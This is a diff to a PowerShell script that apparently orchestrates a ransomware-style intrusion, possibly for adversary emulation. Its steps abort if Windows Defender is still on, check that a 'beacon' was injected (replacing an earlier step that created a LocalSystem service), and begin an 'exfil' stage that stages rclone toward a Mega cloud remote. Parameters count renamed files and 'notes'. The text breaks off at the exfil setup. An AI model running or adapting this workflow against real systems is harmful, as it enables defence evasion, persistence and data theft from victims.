@@ -6,7 +6,7 @@ param(
     [string]$Corpus = 'C:\C0015\corpus',
     [string]$Remote = 'Mega:DATA',
     [int]$ExpectRenamed = 40,
-    [int]$ExpectNotes   = 5
+    [int]$ExpectNotes   = 4
 )
 
 $ErrorActionPreference = 'Continue'
@@ -38,15 +38,10 @@ Step '1' 'defences' { } {
 } 'rt=False' | Out-Null
 if ($script:failed) { Log '1' 'defences' 'abort' 'defender still on'; exit 1 }
 
-Step '2' 'service' {
-    if (-not (Get-Service C0015Svc -ErrorAction SilentlyContinue)) {
-        sc.exe create C0015Svc binPath= 'C:\ProgramData\c0015\svc.exe' start= auto obj= LocalSystem | Out-Null
-        sc.exe start C0015Svc | Out-Null
-    }
-} {
-    (sc.exe query C0015Svc | Out-String)
-} 'RUNNING' | Out-Null
-if ($script:failed) { Log '2' 'service' 'abort' 'service not running'; exit 1 }
+Step '2' 'injection' { } {
+    (Get-Content 'C:\ProgramData\c0015\inject.log' -Tail 1 -ErrorAction SilentlyContinue)
+} 'injector done' | Out-Null
+if ($script:failed) { Log '2' 'injection' 'abort' 'beacon not injected'; exit 1 }
 
 Step '3' 'exfil' {
     $r = Join-Path $Work 'rclone.exe'; $c = Join-Path $Work 'rclone.conf'
